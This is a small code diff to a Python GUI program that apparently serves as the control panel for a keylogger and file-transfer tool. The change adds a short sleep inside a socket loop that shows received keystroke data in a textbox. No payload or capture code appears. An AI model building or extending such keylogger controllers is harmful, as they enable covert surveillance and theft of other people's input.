@@ -177,6 +177,7 @@ class App(customtkinter.CTk):
                                 data = conn.recv(1024).decode("utf-8") 
                                 self.textbox.insert("0.0", f"{data[1:-1]}\n")
                             except: print("\nKeylogger connection reset.\n"); break 
+                            time.sleep(0.0001)
         startSocket()
         
         #? FILE_TRANSFER SOCKET
